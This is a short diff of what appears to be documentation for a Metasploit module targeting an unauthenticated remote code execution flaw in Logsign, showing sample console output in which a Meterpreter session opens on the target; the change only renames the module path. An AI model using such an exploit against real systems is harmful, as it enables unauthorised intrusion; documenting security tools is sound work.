@@ -75,7 +75,8 @@ msf6 auxiliary(exploit/logsign-unauth-rce) > run
 [*] Exploit completed, waiting for session...
 
 [*] Meterpreter session 1 opened (192.168.1.100:1337 -> 192.168.1.10:443) at 2024-08-12 12:34:56 +0000
-msf6 auxiliary(exploit/cve_2024_5716_5717_pre_auth_rce) >
+
+msf6 auxiliary(exploit/logsign-unauth-rce) >
 
 ```
 
